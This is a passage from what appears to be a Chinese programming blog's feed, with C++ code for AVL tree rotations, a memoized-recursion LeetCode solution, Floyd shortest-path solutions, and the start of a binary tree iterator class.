Tree parent=<span class="literal">NULL</span>,son;</span><br><span class="line">    <span class="comment">//获取失衡结点的父节点</span></span><br><span class="line">    parent=node-&gt;parent;</span><br><span class="line">    <span class="comment">//获取失衡结点的右孩子</span></span><br><span class="line">    son=node-&gt;rchild;</span><br><span class="line">    <span class="comment">//设置son结点左孩子的父指针</span></span><br><span class="line">    <span class="keyword">if</span> (son-&gt;lchild!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">          son-&gt;lchild-&gt;parent=node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//失衡结点的右孩子变更为son的左孩子</span></span><br><span class="line">    node-&gt;rchild=son-&gt;lchild;</span><br><span class="line">    <span class="comment">//更新失衡结点的高度信息</span></span><br><span class="line">    <span class="built_in">update_depth</span>(node);</span><br><span class="line">    <span class="comment">//失衡结点变成son的左孩子</span></span><br><span class="line">    son-&gt;lchild=node;</span><br><span class="line">    <span class="comment">//设置son的父结点为原失衡结点的父结点</span></span><br><span class="line">    son-&gt;parent=parent;</span><br><span class="line">    <span class="comment">//如果失衡结点不是根结点，则开始更新父节点</span></span><br><span class="line">    <span class="keyword">if</span> (parent!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//如果父节点的左孩子是失衡结点，指向现在更新后的新孩子son</span></span><br><span class="line">        <span class="keyword">if</span> (parent-&gt;lchild==node)&#123;</span><br><span class="line">            parent-&gt;lchild=son;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//父节点的右孩子是失衡结点</span></span><br><span class="line">            parent-&gt;rchild=son;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置失衡结点的父亲</span></span><br><span class="line">    node-&gt;parent=son;</span><br><span class="line">    <span class="comment">//更新son结点的高度信息</span></span><br><span class="line">    <span class="built_in">update_depth</span>(son);</span><br><span class="line">    <span class="keyword">return</span> son;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LL型"><a href="#LL型" class="headerlink" title="LL型"></a>LL型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//LL型调整函数</span></span><br><span class="line"><span class="comment">//返回:新父节点</span></span><br><span class="line"><span class="function">Tree <span class="title">LL_rotate</span><span class="params">(Tree node)</span></span>&#123;</span><br><span class="line">    <span class="comment">//node为离操作结点最近的失衡的结点</span></span><br><span class="line">    Tree parent=<span class="literal">NULL</span>,son;</span><br><span class="line">    <span class="comment">//获取失衡结点的父节点</span></span><br><span class="line">    parent=node-&gt;parent;</span><br><span class="line">    <span class="comment">//获取失衡结点的左孩子</span></span><br><span class="line">    son=node-&gt;lchild;</span><br><span class="line">    <span class="comment">//设置son结点右孩子的父指针</span></span><br><span class="line">    <span class="keyword">if</span> (son-&gt;rchild!=<span class="literal">NULL</span>)  son-&gt;rchild-&gt;parent=node;</span><br><span class="line">    <span class="comment">//失衡结点的左孩子变更为son的右孩子</span></span><br><span class="line">    node-&gt;lchild=son-&gt;rchild;</span><br><span class="line">    <span class="comment">//更新失衡结点的高度信息</span></span><br><span class="line">    <span class="built_in">update_depth</span>(node);</span><br><span class="line">    <span class="comment">//失衡结点变成son的右孩子</span></span><br><span class="line">    son-&gt;rchild=node;</span><br><span class="line">    <span class="comment">//设置son的父结点为原失衡结点的父结点</span></span><br><span class="line">    son-&gt;parent=parent;</span><br><span class="line">    <span class="comment">//如果失衡结点不是根结点，则开始更新父节点</span></span><br><span class="line">    <span class="keyword">if</span> (parent!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//如果父节点的左孩子是失衡结点，指向现在更新后的新孩子son</span></span><br><span class="line">        <span class="keyword">if</span> (parent-&gt;lchild==node)&#123;</span><br><span class="line">            parent-&gt;lchild=son;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">//父节点的右孩子是失衡结点</span></span><br><span class="line">              parent-&gt;rchild=son;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="comment">//设置失衡结点的父亲</span></span><br><span class="line">    node-&gt;parent=son;</span><br><span class="line">    <span class="comment">//更新son结点的高度信息</span></span><br><span class="line">    <span class="built_in">update_depth</span>(son);</span><br><span class="line">    <span class="keyword">return</span> son;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RL型"><a href="#RL型" class="headerlink" title="RL型"></a>RL型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RL型，先右旋转，再左旋转</span></span><br><span class="line"><span class="comment">//返回:新父节点</span></span><br><span class="line"><span class="function">Tree <span class="title">RL_rotate</span><span class="params">(Tree node)</span></span>&#123;</span><br><span class="line">    <span class="built_in">LL_rotate</span>(node-&gt;rchild);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">RR_rotate</span>(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LR型"><a href="#LR型" class="headerlink" title="LR型"></a>LR型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//LR型，先左旋转，再右旋转</span></span><br><span class="line"><span class="comment">//返回：新父节点</span></span><br><span class="line"><span class="function">Tree <span class="title">LR_rotate</span><span class="params">(Tree node)</span></span>&#123;</span><br><span class="line">    <span class="built_in">RR_rotate</span>(node-&gt;lchild);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">LL_rotate</span>(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AVL树&quot;&gt;&lt;a href=&quot;#AVL树&quot; class=&quot;headerlink&quot; title=&quot;AVL树&quot;&gt;&lt;/a&gt;AVL树&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/56066942&quot;&gt;什么是平衡二叉树（AVL） </summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="树" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/"/>
    
    
    <category term="AVL树" scheme="https://1xueyu1.github.io/tags/AVL%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>记忆化递归</title>
    <link href="https://1xueyu1.github.io/2023/12/03/%E8%AE%B0%E5%BF%86%E5%8C%96%E9%80%92%E5%BD%92/"/>
    <id>https://1xueyu1.github.io/2023/12/03/%E8%AE%B0%E5%BF%86%E5%8C%96%E9%80%92%E5%BD%92/</id>
    <published>2023-12-03T04:46:16.000Z</published>
    <updated>2023-12-03T04:50:08.374Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://leetcode.cn/problems/minimum-path-cost-in-a-grid/description/?envType=daily-question&envId=2023-11-22">2304. 网格中的最小路径代价 - 力扣（LeetCode）</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minPathCost</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; moveCost)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>(), n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 记录dfs(i, j)已经计算过的</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">memo</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">        function&lt;<span class="type">int</span>(<span class="type">int</span>, <span class="type">int</span>)&gt; dfs = [&amp;](<span class="type">int</span> i, <span class="type">int</span> j) -&gt; <span class="type">int</span>&#123;</span><br><span class="line">            <span class="comment">// 到边界了，直接返回</span></span><br><span class="line">            <span class="keyword">if</span>(i == m - <span class="number">1</span>)<span class="keyword">return</span> grid[i][j];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 引用， 记录过就直接返回</span></span><br><span class="line">            <span class="keyword">auto</span>&amp; res = memo[i][j];</span><br><span class="line">            <span class="keyword">if</span>(res)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> res;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 没记录过，就递归求答案</span></span><br><span class="line">            res = INT_MAX;</span><br><span class="line">            <span class="comment">// 移动到下一行的k列</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                res = <span class="built_in">min</span>(res, <span class="built_in">dfs</span>(i + <span class="number">1</span>, k) + moveCost[grid[i][j]][k]);</span><br><span class="line">            &#125;</span><br><span class="line">            res += grid[i][j];</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">int</span> ans = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)<span class="comment">// 枚举起点</span></span><br><span class="line">        &#123;</span><br><span class="line">            ans = <span class="built_in">min</span>(ans, <span class="built_in">dfs</span>(<span class="number">0</span>, j));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://leetcode.cn/problems/minimum-path-cost-in-a-grid/description/?envType=daily-question&amp;envId=2023-11-22&quot;&gt;2304. 网格中的最小路径代价 </summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="图" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/"/>
    
    
    <category term="递归" scheme="https://1xueyu1.github.io/tags/%E9%80%92%E5%BD%92/"/>
    
    <category term="记忆化搜索" scheme="https://1xueyu1.github.io/tags/%E8%AE%B0%E5%BF%86%E5%8C%96%E6%90%9C%E7%B4%A2/"/>
    
  </entry>
  
  <entry>
    <title>最短路径</title>
    <link href="https://1xueyu1.github.io/2023/11/30/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"/>
    <id>https://1xueyu1.github.io/2023/11/30/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/</id>
    <published>2023-11-30T11:13:30.000Z</published>
    <updated>2023-11-30T11:54:21.251Z</updated>
    
    <content type="html"><![CDATA[<h1 id="最短路径"><a href="#最短路径" class="headerlink" title="最短路径"></a>最短路径</h1><p><a href="https://leetcode.cn/problems/find-the-city-with-the-smallest-number-of-neighbors-at-a-threshold-distance/description/?envType=daily-question&envId=2023-11-14">1334. 阈值距离内邻居最少的城市 - 力扣（LeetCode）</a></p><h2 id="Floyd算法"><a href="#Floyd算法" class="headerlink" title="Floyd算法"></a>Floyd算法</h2><h3 id="递归-（记忆化搜索）"><a href="#递归-（记忆化搜索）" class="headerlink" title="递归+（记忆化搜索）"></a>递归+（记忆化搜索）</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findTheCity</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, <span class="type">int</span> distanceThreshold)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">g</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; (n, INT_MAX / <span class="number">2</span>));</span><br><span class="line">        <span class="comment">// 邻接矩阵</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; e : edges)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> x = e[<span class="number">0</span>], y = e[<span class="number">1</span>], dis = e[<span class="number">2</span>];</span><br><span class="line">            g[x][y] = g[y][x] = dis;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记忆化存储</span></span><br><span class="line">        vector&lt;vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&gt; <span class="built_in">mem</span>(n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n)));</span><br><span class="line">        <span class="comment">// dfs(k, i, j)表示从i到j的路径节点 &lt;= k</span></span><br><span class="line">        function&lt;<span class="type">int</span>(<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>)&gt; dfs = [&amp;](<span class="type">int</span> k, <span class="type">int</span> i, <span class="type">int</span> j) -&gt; <span class="type">int</span> &#123;</span><br><span class="line">            <span class="comment">// 到边界, 即从i到j无其他节点</span></span><br><span class="line">            <span class="keyword">if</span>(k &lt; <span class="number">0</span>)<span class="keyword">return</span> g[i][j];</span><br><span class="line">            <span class="comment">// 引用res，能修改mem</span></span><br><span class="line">            <span class="keyword">auto</span>&amp; res = mem[k][i][j];</span><br><span class="line">            <span class="keyword">if</span>(res)<span class="keyword">return</span> res;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 不选k点，dfs(k, i, j) = dfs(k - 1, i, j)</span></span><br><span class="line">            <span class="comment">// 选k点, dfs(k, i, j) = dfs(k - 1, i, k) + dfs(k - 1, k, j)</span></span><br><span class="line">            <span class="keyword">return</span> res = <span class="built_in">min</span>(<span class="built_in">dfs</span>(k - <span class="number">1</span>, i, j), <span class="built_in">dfs</span>(k - <span class="number">1</span>, i, k) + <span class="built_in">dfs</span>(k - <span class="number">1</span>, k, j));</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ans;</span><br><span class="line">        <span class="type">int</span> min_citys = n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(i != j &amp;&amp; <span class="built_in">dfs</span>(n - <span class="number">1</span>, i, j) &lt;= distanceThreshold)</span><br><span class="line">                &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// =的原因时取编号最大的</span></span><br><span class="line">            <span class="keyword">if</span>(cnt &lt;= min_citys)</span><br><span class="line">            &#123;</span><br><span class="line">                min_citys = cnt;</span><br><span class="line">                ans = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="迭代写法"><a href="#迭代写法" class="headerlink" title="迭代写法"></a>迭代写法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findTheCity</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, <span class="type">int</span> distanceThreshold)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">g</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; (n, INT_MAX / <span class="number">2</span>));</span><br><span class="line">        <span class="comment">// 邻接矩阵</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; e : edges)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> x = e[<span class="number">0</span>], y = e[<span class="number">1</span>], dis = e[<span class="number">2</span>];</span><br><span class="line">            g[x][y] = g[y][x] = dis;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">        &#123;</span><br><span class="line">            g[k][k] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 相当于往i到j的路径中间不断加入其他点，并更新所有路径的值</span></span><br><span class="line">                    g[i][j] = <span class="built_in">min</span>(g[i][j], g[i][k] + g[k][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>, min_cnt = n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(g[i][j] &lt;= distanceThreshold)</span><br><span class="line">                &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(cnt &lt;= min_cnt)</span><br><span class="line">            &#123;</span><br><span class="line">                min_cnt = cnt;</span><br><span class="line">                ans = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;最短路径&quot;&gt;&lt;a href=&quot;#最短路径&quot; class=&quot;headerlink&quot; title=&quot;最短路径&quot;&gt;&lt;/a&gt;最短路径&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://leetcode.cn/problems/find-the-city-with-the-s</summary>
      
    
    
    
    <category term="数据结构" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="图" scheme="https://1xueyu1.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/"/>
    
    
    <category term="最短路径" scheme="https://1xueyu1.github.io/tags/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"/>
    
  </entry>
  
  <entry>
    <title>二叉树迭代器</title>
    <link href="https://1xueyu1.github.io/2023/11/27/%E4%BA%8C%E5%8F%89%E6%A0%91%E8%BF%AD%E4%BB%A3%E5%99%A8/"/>
    <id>https://1xueyu1.github.io/2023/11/27/%E4%BA%8C%E5%8F%89%E6%A0%91%E8%BF%AD%E4%BB%A3%E5%99%A8/</id>
    <published>2023-11-27T14:36:10.000Z</published>
    <updated>2023-11-28T05:10:39.528Z</updated>
    
    <content type="html"><![CDATA[<h2 id="二叉树迭代器（前序遍历）"><a href="#二叉树迭代器（前序遍历）" class="headerlink" title="二叉树迭代器（前序遍历）"></a>二叉树迭代器（前序遍历）</h2><h3 id="定义树节点"><a href="#定义树节点" class="headerlink" title="定义树节点"></a>定义树节点</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 树节点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>* left, * right;</span><br><span class="line">&#125;TreeNode;</span><br></pre></td></tr></table></figure><h3 id="创建二叉树类"><a href="#创建二叉树类" class="headerlink" title="创建二叉树类"></a>创建二叉树类</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 二叉树类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">BinaryTree</span>() &#123;&#125;</span><br><span class="line"><span class="comment">// 二叉树构造函数</span></span><br><span class="line"><span class="built_in">BinaryTree</span>(<span class="type">int</span> num[], <span class="type">int</span> numSize, <span class="type">int</span>* index)</span><br><span class="line">&#123;</span><br><span class="line">root = <span class="built_in">creatBinaryTree</span>(num, numSize, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建二叉树函数</span></span><br><span class="line"><span class="function">TreeNode* <span class="title">creatBinaryTree</span><span class="params">(<span class="type">int</span> num[], <span class="type">int</span> numSize, <span class="type">int</span>* index)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回begin迭代器</span></span><br><span class="line"><span class="function">BinaryTreeIterator <span class="title">begin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">BinaryTreeIterator</span>(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回end迭代器</span></span><br><span class="line"><span class="function">BinaryTreeIterator <span class="title">end</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">BinaryTreeIterator</span>(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addFive</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(BinaryTreeIterator it = <span class="built_in">begin</span>(); it != <span class="built_in">end</span>(); ++it)</span><br><span class="line">&#123;</span><br><span class="line">(*it)-&gt;val += <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">TreeNode* root;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode* <span class="title">BinaryTree::creatBinaryTree</span><span class="params">(<span class="type">int</span> num[], <span class="type">int</span> numSize, <span class="type">int</span>* index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//如果数组当前值为-1，空节点</span></span><br><span class="line"><span class="keyword">if</span> (num[(*index)] == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">(*index)++;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">TreeNode* root = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> ((*index) &lt; numSize)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//否则新建节点</span></span><br><span class="line">root = (TreeNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(TreeNode));</span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;内存分配失败!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">root-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">root-&gt;right = <span 